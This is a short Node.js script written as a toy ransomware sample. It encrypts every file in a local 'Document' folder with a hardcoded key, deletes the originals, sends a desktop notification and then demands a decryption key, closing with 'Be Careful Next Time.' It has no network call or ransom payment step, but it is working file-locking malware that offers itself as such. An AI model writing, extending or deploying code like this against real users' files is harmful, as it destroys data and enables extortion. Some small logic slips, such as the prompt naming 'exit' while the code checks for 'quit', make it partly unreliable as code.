const encryptor = require("file-encryptor");
const readlineSync = require("readline-sync");
const fs = require("fs");
const notifier = require('node-notifier');

const key = "Bulate2k24@PlanetEarth";
const dir = "./Document/";

function encryptFile(file, encryptedFile, callback) {
  encryptor.encryptFile(file, encryptedFile, key, callback);
}

function decryptFile(encryptedFile, decryptedFile, callback) {
  encryptor.decryptFile(encryptedFile, decryptedFile, key, callback);
}

function notify(message) {
  notifier.notify({
    title: 'File Encryption/Decryption',
    message: message
  });
}

function encryptFiles() {
  const files = fs.readdirSync(dir);
  let filesEncrypted = 0;

  const encryptedFilesExist = files.some(file => file.endsWith('.encrypt'));
  if (encryptedFilesExist) {
    notify("Files are already encrypted. Starting decryption...");
    startDecryption();
    return;
  }

  files.forEach((file) => {
    encryptFile(`${dir}${file}`, `${dir}${file}.encrypt`, function (err) {
      if (err) {
        console.error("Error encrypting file:", err);
        return;
      }
      fs.unlinkSync(`${dir}${file}`);
      filesEncrypted++;
      if (filesEncrypted === files.length) {
        notify("Your files have been encrypted.");
        startDecryption();
      }
    });
  });
}

function startDecryption() {
  while (true) {
    const decryptionKey = readlineSync.question("Please Enter The Decryption Key Needed: ");

    if (decryptionKey.toLowerCase() === "quit") {
      console.log("Exiting the process....");
      return;
    }

    if (decryptionKey === key) {
      decryptFiles(decryptionKey);
      break;
    } else {
      console.log(
        'Incorrect decryption key. Please try again to continue or type "exit" to quit.'
      );
    }
  }
}

function decryptFiles(decryptionKey) {
  const encryptedFiles = fs.readdirSync(dir);
  let filesDecrypted = 0;

  encryptedFiles.forEach((file) => {
    if (file.endsWith('.encrypt')) {
      decryptFile(
        `${dir}${file}`,
        `${dir}${file.replace(".encrypt", "")}`,
        function (err) {
          if (err) {
            console.error("Error decrypting file:", err);
            return;
          }

          fs.unlinkSync(`${dir}${file}`);
          filesDecrypted++;

          if (filesDecrypted === encryptedFiles.length) {
            notify("Congratulations, Your Files Have been Decrypted. Thank you, Be Careful Next Time.");
            return;
          }
        }
      );
    }
  });
}

encryptFiles();
